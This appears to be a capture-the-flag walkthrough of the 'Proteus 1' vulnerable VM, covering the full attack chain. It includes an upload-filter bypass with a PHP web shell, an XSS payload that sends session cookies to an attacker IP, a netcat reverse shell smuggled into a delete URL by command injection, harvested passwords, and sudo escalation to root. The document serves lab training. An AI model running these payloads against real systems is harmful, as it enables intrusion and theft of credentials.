@@ -1,0 +1,225 @@
+Proteus 1 Walkthrough - DigiP
+
+netdiscover
+192.168.1.184   08:00:27:bb:8f:5f     20    1200  PCS Systemtechnik GmbH
+
+
+nmap -sC -sV -T5 --open -Pn -v -A -p- 192.168.1.184
+
+Discovered open port 80/tcp on 192.168.1.184
+Discovered open port 22/tcp on 192.168.1.184
+Discovered open port 5355/tcp on 192.168.1.184
+
+We upload an executable, and in the page we see it's used (or appears to use) a hashing process to rename the file and gives us the path
+/home/malwareadm/samples/59664b25efadd.bin: file format elf32-i386
+
+However, trying to load http://192.168.1.184/samples/59664b25efadd.bin loads nothing.
+
+We also see an email using the same name malwareadm@proteus.local
+
+Potential username "malwareadm" 
+
+I tried uploading a PHP shell file, but is filtered and only accpets executables. We try some curl fu
+
+Can try a proxy like burp or webscarab, maybe get better results.
+
+In testing, I also constructed a new file. I took a binary, and ran the following to create a header that passes the sniff test:
+
+head -n 1 cap2hccap.bin | base64 > test.php
+
+Uploading, this seems to go just fine, no errors.
+
+I then added the following to the end of the file:
+<?php system($_GET['cmd']); ?>
+
+This uploads as php, so I used webscarab to intercept, and change the content type from application/x-php to application/octet-stream
+
+Once this was done, we can see our file actually uploaded by viewing the source of the site:
+
+<h2>File: NTk2NzQyMTI2NjQ0MS5waHA=</h2>
+<div class="row" >
+<div class="col-md-6" style="word-wrap: break-word;">
+<h2>Strings</h2>
+<code><?php system($_GET['cmd']); ?><br /></code>
+
+As of now, we know the file was accepted for upload, but we don't know where the file is stored. Also, the php code is added to the page using <code> tags, so it will not execute it on this page or be of use to us here, but until we can find our actual test.php or whatever it might have renamed it to.
+
+I want to try another test real fast though. If <code> is wrapped oround our code, can we escape it? 
+ie: start our file with </code> and end it with a <code> tag.
+
+root@kali:~/HDD2/ctf/proteus-1# echo f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAQIgECDQAAADYMQAAAAAAADQAIAAK | base64 -d > test.php
+root@kali:~/HDD2/ctf/proteus-1# echo "</code><?php system(\$_GET['cmd']); ?>This is a test<code>"
+</code><?php system($_GET['cmd']); ?>This is a test<code>
+root@kali:~/HDD2/ctf/proteus-1# echo "</code><?php system(\$_GET['cmd']); ?>This is a test<code>" >> test.php 
+root@kali:~/HDD2/ctf/proteus-1# head -n 1 test.php 
+ELF@4�14 
+
+ok, so looks like our header is in tact. DO NOT edit directly with a text editor. You have to echo the info in, to preserve the binary header, or you'll lose all the formatting for the sniff test!
+
+
+This seems to have wrapped properly, but in rendering, we get the following:
+<code></code><?php system($_GET['cmd']); ?>This is a test<code><br />
+</code>
+
+as plain html output and the page is still not executable. PHP injection will not help us here. Lets try some Javascript.
+
+Lets try the same file, with a application/x-executable instead of application/octet-stream
+
+Well, our HTML rendered this time with
+                <code></code><br />
+<pre><?php system($_GET['cmd']); ?>This is a test</pre><br />
+<code><br />
+
+We know we can send anything we want to try and execute, so we try some basic alert boxes for javascript. While amusing adn working, not very useful in this context. 
+
+We try adding the following:
+
+</code><script>document.write('<img src="http://192.168.1.66/?cookie='+document.cookie+'" />');</script><code>
+
+We start a local listener with netcat to catch the cookies:
+
+nc -nlvkp 80
+
+Then we upload our file, using the same header to pass the sniff test, with the above html code. This time, it goes, without even needing to change the requested file type, as I just renamed the file to .html with the binary header and it took with no issue, no need for browser proxy at all.
+
+Netcat spits out the following:
+
+root@kali:~/HDD2/ctf/proteus-1# nc -nlvkp 80
+listening on [any] 80 ...
+connect to [192.168.1.66] from (UNKNOWN) [192.168.1.184] 36268
+GET /?cookie=proteus_session=1499945941%7CZinqWvJggUS9jlFoThDM5C38Q3EhmR1Qvs3xgbLudpgJM9AXoQud%2BRQRvCejCdSThTsykGw%2Fbm41mwBqChvHFd3nQDwt2WM8F6CAKv6M55c3LVstacZfu8qPdVF6VeEG%7C67ae0165626496d95004c73e04b06c8dd0b37317 HTTP/1.1
+Referer: http://127.0.0.1/samples
+User-Agent: Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Accept: */*
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en-ZA,*
+
+If we compare:
+proteus_session=1499945941%7CZinqWvJggUS9jlFoThDM5C38Q3EhmR1Qvs3xgbLudpgJM9AXoQud%2BRQRvCejCdSThTsykGw%2Fbm41mwBqChvHFd3nQDwt2WM8F6CAKv6M55c3LVstacZfu8qPdVF6VeEG%7C67ae0165626496d95004c73e04b06c8dd0b37317
+
+to our regular browser session cookie:
+"proteus_session=1499945944%7CHTU4jJiE7XlNfcsFsjltkxhqvtrf5YqbwL8sx82Oe%2BI%3D%7Ca7ae702282129ebde79cb88eb42849ffbe5bfae9"
+
+we can see there is a larger cookie in the request when we uploaded the file. Lets manually load this cookie in our browser and see what happens.
+
+w00t! We're now logged in as the admin!
+	
+	"Logged in as: malwareadm"
+
+In doing so, it looks like we have some new options on the screen. We can now "delete" the items we uploaded apparently. Before we do that, lets inspect what this actually does,since we want to use our uploaded scripts if we can and not delete them.
+
+<a type="button" href="/delete/NTk2NjRiMjVlZmFkZC5iaW4=" class="btn btn-danger pull-right">Delete</a>
+
+Sure enough, when we click, it deletes our file. Browsing directly to the file has the same effect. The above base64 corresponds to the file name we deleted which was "59664b25efadd.bin". If we add to this base64 some appended instructions, maybe we can send commands to the system. We try base64 encoding our test as follows:
+
+5967c0abbf1fd.bin;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.66 1234 >/tmp/f
+
+Now we just start a local listener again on port 80 and then navigate to the delete url like so:
+
+5967c0abbf1fd.bin;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.66 1234 >/tmp/f
+
+http://192.168.1.184/delete/NTk2N2MwYWJiZjFmZC5iaW4gO3JtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDE5Mi4xNjguMS42NiAxMjM0ID4vdG1wL2Y=
+
+If you do this on a file that doesn't exist, it won't work. Just upload any executable, and use it's name in the above to complete the string. 
+
+Once in, we are www-data. We can now browse some of the files. We look in /home/malwareadm/sites/proteus_site/
+
+$ cat admin_login_request.js
+// THIS IS JUST USED TO IMPERSONATE AN ADMIN FOR THE CHALLENGE
+
+var username  = 'malwareadm';
+var pwd = 'q-L%40X%21%7Bl_%278%7C%29o%3FQ%2BTapahQ%3C_';
+
+var webPage = require('webpage');
+var page = webPage.create();
+var postBody = 'username=' + username + '&password=' + pwd;
+
+page.open('http://127.0.0.1/samples', 'post', postBody, function (status) {
+        if (status !== 'success') {
+                console.log('Unable to post!');
+        } else {
+                console.log(JSON.stringify({
+                        cookies: phantom.cookies
+                }));
+        }
+        phantom.exit();
+});
+$ 
+
+Trying this for SSH was a no go.
+
+q-L%40X%21%7Bl_%278%7C%29o%3FQ%2BTapahQ%3C_
+URL decoded is "q-L@X!{l_'8|)o?Q+TapahQ<_" just in case we need to log back in to the admin panel.
+
+We update to a tty shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+type bash and then hit enter
+ctrl+z
+echo $TERM
+save this info > in our case, it's xterm-256color
+now type "stty -a" and hit enter. Make note of the rows and columns, we'll need those in a sec
+"stty raw -echo" and hit enter. Now type "fg" and then type "reset" and hit enter. 
+When prompted hit enter.
+
+now:
+export SHELL=bash;export TERM=xterm256-color;stty rows 36 columns 135
+
+You should now have a FULL interactive shell with bash tab completion! ala - https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+w00t!! 
+
+su malwareadm
+password from our above findings: q-L@X!{l_'8|)o?Q+TapahQ<_
+w0tw0t?? Okay!!
+
+Browsing we find databse user info for root
+malwareadm@Proteus:~/sites/proteus_site/web/cfg$ cat config.php 
+<?php
+
+class Conf
+{
+
+    /* MySQL */
+    const MYSQL_USERNAME    =   'root';
+    const MYSQL_PASSWORD    =   'viWJ.cgdf&3a]d3xh;C/c]&c?';
+    const MYSQL_HOST        =   '127.0.0.1';
+    const MYSQL_DATABASE    =   'proteus_db';
+
+    /* Application */
+    const DEBUG                 =   false;                          //true/false
+    const INSTALLED_DIRECTORY   =   '/';                        //something
+    const MAIL_ALIAS                =   'malwareadm@proteus.local';     //Something like user@internet.co.za
+    const SECRET                =   'thisisthesecret';          //This is the secret to salt the hashes
+    const FILE_PATH             =   '/home/malwareadm/samples/'; //This is the file path of where the execs will be saved
+}
+malwareadm@Proteus:~/sites/proteus_site/web/cfg$ 
+
+su root
+pass: viWJ.cgdf&3a]d3xh;C/c]&c?
+
+no good. I havne't checked "sudo -l' yet though, so lets see.
+
+malwareadm@Proteus:~/sites/proteus_site/web/cfg$ sudo -l
+[sudo] password for malwareadm: 
+Matching Defaults entries for malwareadm on Proteus:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User malwareadm may run the following commands on Proteus:
+    (ALL : ALL) ALL
+malwareadm@Proteus:~/sites/proteus_site/web/cfg$ 
+
+doh!!
+
+sudo su
+root@Proteus:/home/malwareadm/sites/proteus_site/web/cfg# id;whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+root@Proteus:/home/malwareadm/sites/proteus_site/web/cfg# 
+
+with that, we go to ~ and copy out the flag.png 
+Mr Hackerman, I think we are done!
+
+
+
+:)
